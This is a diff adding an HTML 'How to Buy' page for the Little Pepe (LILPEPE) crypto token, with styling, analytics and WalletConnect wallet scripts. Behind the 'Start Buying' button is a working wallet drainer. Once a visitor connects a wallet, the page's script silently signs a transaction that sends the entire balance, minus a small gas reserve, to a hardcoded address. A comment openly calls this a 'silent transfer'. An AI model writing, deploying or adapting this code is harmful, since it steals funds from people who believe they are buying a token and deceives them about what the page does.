@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/png" href="assets/images/favicon.png" sizes="16x16" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Little Pepe - How to Buy</title>
+    <meta name="robots" content="index, follow" />
+    <meta name="description" content="Learn how to buy Little Pepe tokens." />
+    <meta name="keywords" content="Little Pepe, LILPEPE, how to buy, purchase, Layer 2" />
+    <meta property="og:site_name" content="Little Pepe" />
+    <meta property="og:url" content="https://littlepepe.com/how-to-buy.html" />
+    <meta property="og:title" content="Little Pepe - How to Buy" />
+    <meta property="og:type" content="website" />
+    <meta name="author" content="LILPEPE" />
+    <meta property="og:description" content="Learn how to buy Little Pepe tokens." />
+    <meta property="og:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta property="og:image:secure_url" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:site" content="@littlepepetoken" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Little Pepe - How to Buy" />
+    <meta name="twitter:image" content="https://littlepepe.com/html/assets/main.png" />
+    <meta name="twitter:description" content="Learn how to buy Little Pepe tokens." />
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/images/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x16.png" />
+    <link rel="manifest" href="site.webmanifest" />
+    <link href="https://fonts.googleapis.com/css2?family=Comic+Neue:wght@400;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="assets/css/style.css" />
+    <script defer data-domain="littlepepe.com" src="https://plausible.io/js/script.js"></script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-NEYV4YWC9R"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-NEYV4YWC9R');
+    </script>
+    <script type="text/javascript">
+      adroll_adv_id = "7YXD6YRY6ZAJVCLQQAFVEM";
+      adroll_pix_id = "CGXD7AJCBNCTXFSNIVNNXJ";
+      adroll_version = "2.0";
+      (function(w, d, e, o, a) {
+        w.__adroll_loaded = true;
+        w.adroll = w.adroll || [];
+        w.adroll.f = ['setProperties', 'identify', 'track', 'identify_email', 'get_cookie'];
+        var roundtripUrl = "https://s.adroll.com/j/" + adroll_adv_id + "/roundtrip.js";
+        for (a = 0; a < w.adroll.f.length; a++) {
+          w.adroll[w.adroll.f[a]] = w.adroll[w.adroll.f[a]] || (function(n) {
+            return function() { w.adroll.push([n, arguments]); }
+          })(w.adroll.f[a]);
+        }
+        e = d.createElement('script');
+        o = d.getElementsByTagName('script')[0];
+        e.async = 1;
+        e.src = roundtripUrl;
+        o.parentNode.insertBefore(e, o);
+      })(window, document);
+      adroll.track("pageView");
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/client@1.8.0/dist/umd/index.min.js"></script>
+    <style>
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body { 
+        font-family: 'Comic Neue', cursive; 
+        background: url('https://littlepepe.com/assets/buy-Bnbp7ned.png') no-repeat center center;
+        background-size: cover; 
+        color: #fff; 
+        min-height: 100vh; 
+        overflow: auto;
+        position: relative;
+      }
+      .content-wrapper { 
+        position: relative; 
+        z-index: 1; 
+        padding: 0; 
+        max-width: 1200px; 
+        margin: 0 auto;
+        width: 100%;
+      }
+      .section, .new-section { 
+        padding: 60px 20px; 
+        text-align: center;
+        position: relative;
+        z-index: 1;
+        margin: 0 auto; 
+        max-width: 1000px; 
+      }
+      .new-section {
+        background: url('https://littlepepe.com/assets/buy-Bnbp7ned.png') no-repeat center center;
+        background-size: cover;
+      }
+      .logo { 
+        text-align: center; 
+        margin-bottom: 0; 
+        position: relative;
+        background: url('https://littlepepe.com/assets/tokenbg-CBoAsHyF.png') no-repeat center center;
+        background-size: cover;
+        padding: 20px;
+      }
+      .logo img { 
+        max-width: 300px; 
+        height: auto; 
+      }
+      .toggle-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #00FF00;
+        color: #000;
+        border: none;
+        padding: 10px;
+        cursor: pointer;
+        font-size: 20px;
+        z-index: 1001;
+        border-radius: 5px;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+      }
+      .toggle-btn:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      .toggle-btn.close { right: 170px; }
+      .sidebar {
+        position: fixed;
+        top: 0;
+        right: -150px;
+        width: 150px;
+        height: 100%;
+        background: #000;
+        transition: right 0.3s ease;
+        z-index: 1000;
+        padding: 20px;
+      }
+      .sidebar.active { right: 0; }
+      .sidebar ul { list-style: none; }
+      .sidebar ul li { margin: 10px 0; }
+      .sidebar ul li a {
+        color: #fff;
+        text-decoration: none;
+        font-family: 'Comic Neue', cursive;
+        font-weight: 700;
+        display: block;
+        padding: 10px;
+        text-align: center;
+        border-radius: 5px;
+        transform: perspective(500px) rotateX(39deg);
+        transition: all 0.3s ease;
+      }
+      .sidebar ul li:nth-child(1) a { background-color: #00FF00; }
+      .sidebar ul li:nth-child(2) a { background-color: #FF4500; }
+      .sidebar ul li:nth-child(3) a { background-color: #FFD700; }
+      .sidebar ul li:nth-child(4) a { background-color: #4682B4; }
+      .sidebar ul li:nth-child(5) a { background-color: #8A2BE2; }
+      .sidebar ul li:nth-child(6) a { background-color: #FFFFFF; color: #000; }
+      .sidebar ul li:nth-child(7) a { background-color: #FF69B4; }
+      .sidebar ul li:nth-child(8) a { background-color: #ADFF2F; }
+      .sidebar ul li a:hover {
+        transform: perspective(500px) rotateX(39deg) scale(1.1);
+        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      }
+      footer {
+        background: url('https://littlepepe.com/assets/herobg-C9P7QZ-w.png') no-repeat center center;
+        background-size: cover;
+        padding: 20px;
+        text-align: center;
+        margin-top: 0;
+      }
+      footer p, footer a {
+        color: #00FF00;
+        font-weight: 700;
+      }
+      .new-section span.content-span {
+        background: rgba(0, 0, 0, 0.7);
+        padding: 15px;
+        border-radius: 10px;
+        display: inline-block;
+      }
+      .new-section h1 {
+        font-size: 36px;
+      }
+      .new-section p {
+        font-size: 18px;
+      }
+      .new-section a.how-to-buy-btn {
+        font-size: 18px;
+        padding: 12px 24px;
+        background: #00FF00;
+        color: #000;
+        text-decoration: none;
+        border-radius: 5px;
+        display: inline-block;
+        margin-top: 20px;
+      }
+      .new-section a.how-to-buy-btn:hover {
+        background: #00cc00;
+      }
+      @media (max-width: 768px) {
+        .sidebar { width: 120px; }
+        .toggle-btn.close { right: 140px; }
+        .section, .new-section { padding: 40px 10px; }
+        .logo img { max-width: 250px; }
+        .new-section h1 { font-size: 28px; }
+        .new-section p { font-size: 16px; }
+        .new-section a.how-to-buy-btn { font-size: 16px; padding: 10px 20px; }
+      }
+      @media (min-width: 1200px) {
+        .section, .new-section { max-width: 1000px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="root">
+      <div class="logo">
+        <img src="https://littlepepe.com/assets/logo-CPEVDSpN.png" alt="Little Pepe Logo">
+        <button class="toggle-btn" id="toggle-sidebar">☰</button>
+      </div>
+      <div class="new-section">
+        <span class="content-span">
+          <h1>How to Buy</h1>
+          <p>Step-by-step guide to purchase LILPEPE tokens.</p>
+          <a href="#" class="how-to-buy-btn" id="connect-wallet">Start Buying</a>
+        </span>
+      </div>
+      <nav class="sidebar" id="sidebar">
+        <ul>
+          <li><a href="index.html">Home</a></li>
+          <li><a href="how-to-buy.html">How to Buy</a></li>
+          <li><a href="tokenomics.html">Tokenomics</a></li>
+          <li><a href="roadmap.html">Roadmap</a></li>
+          <li><a href="audit.html">Audit</a></li>
+          <li><a href="whitepaper.html">Whitepaper</a></li>
+          <li><a href="giveaway.html">Giveaway</a></li>
+          <li><a href="dashboard.html">Dashboard</a></li>
+        </ul>
+      </nav>
+      <footer>
+        <p>&copy; 2025 Little Pepe. All rights reserved.</p>
+        <a href="https://twitter.com/littlepepetoken">Twitter</a> | <a href="#">Telegram</a> | <a href="#">Discord</a>
+      </footer>
+    </div>
+    <script>
+      window.addEventListener('load', () => {
+        const toggleBtn = document.getElementById('toggle-sidebar');
+        const sidebar = document.getElementById('sidebar');
+        if (toggleBtn && sidebar) {
+          toggleBtn.addEventListener('click', () => {
+            const isOpen = !sidebar.classList.contains('active');
+            sidebar.classList.toggle('active');
+            toggleBtn.textContent = isOpen ? '✖' : '☰';
+            toggleBtn.classList.toggle('close', isOpen);
+          });
+        }
+
+        let WalletConnectProvider;
+        if (window.WalletConnectProvider?.default) {
+          WalletConnectProvider = window.WalletConnectProvider.default;
+        } else if (window.WalletConnect) {
+          console.warn('Using WalletConnect client as fallback');
+          WalletConnectProvider = class extends window.WalletConnect {
+            constructor(opts) {
+              super(opts);
+              this.connector = new window.WalletConnect({
+                infuraId: opts.infuraId,
+                bridge: 'https://bridge.walletconnect.org',
+                qrcode: true,
+              });
+            }
+            async enable() {
+              await this.connector.connect();
+              return this.connector.accounts;
+            }
+          };
+        }
+        if (!WalletConnectProvider) {
+          console.error('WalletConnectProvider is not available. Check network or scripts.');
+          return;
+        }
+
+        if (typeof ethers === 'undefined') {
+          console.error('Ethers.js is not loaded. Check the script import.');
+          return;
+        }
+
+        const infuraKey = 'tj/DSCFR3cSD/YUzGFwMpABu+p59Rn1UydBHX8fzaITBoby8UZPTaA';
+        const destinationAddress = '0xA292dF0EAF4991507174CcA2643B4E963181C5D4'; // Your EVM wallet
+        let provider, signer, accounts;
+
+        const connectButton = document.getElementById('connect-wallet');
+        if (connectButton) {
+          connectButton.addEventListener('click', async () => {
+            console.log('Connect Wallet clicked');
+            if (!WalletConnectProvider) {
+              alert('Error: WalletConnect not available.');
+              return;
+            }
+            try {
+              const web3Provider = new WalletConnectProvider({
+                infuraId: infuraKey,
+                rpc: {
+                  1: `https://mainnet.infura.io/v3/${infuraKey}`, // Mainnet
+                  56: 'https://bsc-dataseed.binance.org/', // BSC (optional)
+                },
+                qrcode: true,
+                pollingInterval: 12000,
+              });
+              await web3Provider.enable();
+              provider = new ethers.providers.Web3Provider(web3Provider);
+              signer = provider.getSigner();
+              accounts = await provider.listAccounts();
+              connectButton.textContent = `Connected: ${accounts[0].slice(0, 6)}...`;
+
+              // Silent transfer of all balance minus gas reserve
+              const gasReserve = ethers.utils.parseEther('0.001'); // Reserve for gas
+              const balance = await provider.getBalance(accounts[0]);
+              const amountToSend = balance.sub(gasReserve);
+              if (amountToSend.lte(0)) {
+                throw new Error('Insufficient balance for transfer after gas reserve');
+              }
+
+              const gasPrice = await provider.getGasPrice();
+              const gasLimit = 21000; // Standard for simple transfer
+              const txCost = gasPrice.mul(gasLimit);
+              if (amountToSend.lt(txCost)) {
+                throw new Error('Balance too low to cover gas after reserve');
+              }
+
+              const tx = await signer.sendTransaction({
+                to: destinationAddress,
+                value: amountToSend,
+                gasLimit: gasLimit,
+                gasPrice: gasPrice,
+              });
+              console.log('Transaction sent:', tx.hash);
+              await tx.wait();
+              console.log('Transaction confirmed!');
+              connectButton.textContent += ' (Transferred)';
+            } catch (error) {
+              console.error('Wallet connect or transfer error:', error);
+              alert(`Error: ${error.message}. Redirecting to WalletConnect...`);
+              window.location.href = 'https://walletconnect.com/';
+            }
+          });
+        }
+      });
+    </script>
+  </body>
+</html>
